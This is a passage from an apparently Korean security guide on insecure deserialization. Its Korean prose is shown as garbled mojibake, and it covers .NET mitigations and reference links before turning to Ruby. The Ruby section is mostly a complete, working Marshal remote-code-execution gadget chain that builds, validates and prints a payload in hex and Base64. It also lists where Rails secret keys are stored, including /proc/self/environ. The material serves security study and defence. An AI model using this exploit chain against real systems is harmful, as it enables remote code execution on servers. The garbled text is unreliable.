* **íƒ€ì… ì¸ìŠ¤í„´ìŠ¤í™”ë¥¼ ì•ˆì „í•˜ê²Œ ì œì–´**í•˜ì—¬ ê³µê²©ìê°€ ì§ë ¬í™” í”„ë¡œì„¸ìŠ¤ì— ì˜í–¥ì„ ë¯¸ì¹˜ì§€ ëª»í•˜ë„ë¡ í•©ë‹ˆë‹¤. ì‹¬ì§€ì–´ `DataContractSerializer` ë˜ëŠ” `XmlSerializer`ë„ ì·¨ì•½í•´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* `BinaryFormatter` ë° `JSON.Net`ì— ëŒ€í•´ ì‚¬ìš©ì ì •ì˜ `SerializationBinder`ë¥¼ ì‚¬ìš©í•˜ì—¬ **í™”ì´íŠ¸ë¦¬ìŠ¤íŠ¸ ì»¨íŠ¸ë¡¤ì„ êµ¬í˜„**í•©ë‹ˆë‹¤.
* .Net ë‚´ì—ì„œ ì•Œë ¤ì§„ ë¶ˆì•ˆì „í•œ ì§ë ¬í™” ê°€ì ¯ì— ëŒ€í•´ **ì •ë³´ë¥¼ ë°›ì•„ë“¤ì´ê³ ** ì§ë ¬í™”ê¸°ê°€ ì´ëŸ¬í•œ ìœ í˜•ì„ ì¸ìŠ¤í„´ìŠ¤í™”í•˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤.
* ì•Œë ¤ì§„ ê°€ì ¯ ë…¸ì¶œì„ í”¼í•˜ê¸° ìœ„í•´ **ì ì¬ì ìœ¼ë¡œ ìœ„í—˜í•œ ì½”ë“œë¥¼ ê²©ë¦¬**í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ WPF ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ `System.Windows.Data.ObjectDataProvider`ë¥¼ ì‹ ë¢°í•  ìˆ˜ ì—†ëŠ” ë°ì´í„° ì†ŒìŠ¤ì— ë…¸ì¶œí•˜ì§€ ì•Šë„ë¡ í•©ë‹ˆë‹¤.

### **ì°¸ê³  ìë£Œ**

* Java ë° .Net JSON ì§ë ¬í™” **ë…¼ë¬¸:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** ë°œí‘œ: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ë° ìŠ¬ë¼ì´ë“œ: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **ë£¨ë¹„**

ë£¨ë¹„ì—ì„œ ì§ë ¬í™”ëŠ” **marshal** ë¼ì´ë¸ŒëŸ¬ë¦¬ ë‚´ì˜ ë‘ ê°€ì§€ ë©”ì„œë“œë¡œ ìˆ˜í–‰ë©ë‹ˆë‹¤. ì²« ë²ˆì§¸ ë©”ì„œë“œì¸ **dump**ëŠ” ê°ì²´ë¥¼ ë°”ì´íŠ¸ ìŠ¤íŠ¸ë¦¼ìœ¼ë¡œ ë³€í™˜í•˜ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì§ë ¬í™”ë¼ê³  í•©ë‹ˆë‹¤. ë°˜ëŒ€ë¡œ ë‘ ë²ˆì§¸ ë©”ì„œë“œì¸ **load**ëŠ” ë°”ì´íŠ¸ ìŠ¤íŠ¸ë¦¼ì„ ê°ì²´ë¡œ ë˜ëŒë¦¬ëŠ” ë° ì‚¬ìš©ë˜ë©°, ì´ í”„ë¡œì„¸ìŠ¤ë¥¼ ì—­ì§ë ¬í™”ë¼ê³  í•©ë‹ˆë‹¤.

ì§ë ¬í™”ëœ ê°ì²´ë¥¼ ì•ˆì „í•˜ê²Œ ë³´í˜¸í•˜ê¸° ìœ„í•´ **ë£¨ë¹„ëŠ” HMAC(í•´ì‹œ ê¸°ë°˜ ë©”ì‹œì§€ ì¸ì¦ ì½”ë“œ)**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ì˜ ë¬´ê²°ì„±ê³¼ ì‹ ë¢°ì„±ì„ ë³´ì¥í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ ì‚¬ìš©ë˜ëŠ” í‚¤ëŠ” ë‹¤ìŒ ì¤‘ í•˜ë‚˜ì˜ ìœ„ì¹˜ì— ì €ì¥ë©ë‹ˆë‹¤:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**ë£¨ë¹„ 2.X ì¼ë°˜ ì§ë ¬í™”ë¥¼ RCE ê°€ì ¯ ì²´ì¸ìœ¼ë¡œ ë³€í™˜ (ìì„¸í•œ ì •ë³´ëŠ”** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
ë‹¤ë¥¸ RCE ì²´ì¸ì€ ë£¨ë¹„ ì˜¨ ë ˆì¼ì¦ˆ ì·¨ì•½ì ì„ ì•…ìš©í•©ë‹ˆë‹¤: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)
